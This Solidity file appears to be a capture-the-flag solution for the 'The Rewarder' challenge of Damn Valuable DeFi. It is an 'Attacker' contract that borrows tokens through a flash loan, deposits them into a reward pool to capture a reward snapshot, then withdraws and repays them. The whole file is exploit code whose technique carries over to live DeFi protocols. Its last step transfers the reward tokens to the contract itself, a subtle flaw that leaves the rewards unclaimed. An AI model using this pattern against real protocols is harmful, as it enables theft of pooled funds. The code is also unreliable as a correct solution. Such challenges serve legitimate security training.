// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "hardhat/console.sol";
import "./DamnValuableToken.sol";
import "./RewarderPool.sol";
import "./RewardToken.sol";

contract Attacker {
    FlashLoanerPool public flashLoanerPool;
    DamnValuableToken public damnToken;
    TheRewarderPool public rewarderPool;
    RewardToken public rewarderToken;

    constructor(
        address _flashLoaner,
        address _damnValuableToken,
        address _rewarderPool,
        address _rewardToken
    ) {
        flashLoanerPool = FlashLoanerPool(_flashLoaner);
        damnToken = DamnValuableToken(_damnValuableToken);
        rewarderPool = TheRewarderPool(_rewarderPool);
        rewarderToken = RewardToken(_rewardToken);
    }

    function getTokens(uint256 amount) public {
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) public {
        damnToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);

        rewarderPool.withdraw(amount);

        damnToken.transfer(msg.sender, amount);
        rewarderToken.transfer(
            address(this),
            rewarderToken.balanceOf(address(this))
        );
    }

    fallback() external payable {}

    receive() external payable {}
}
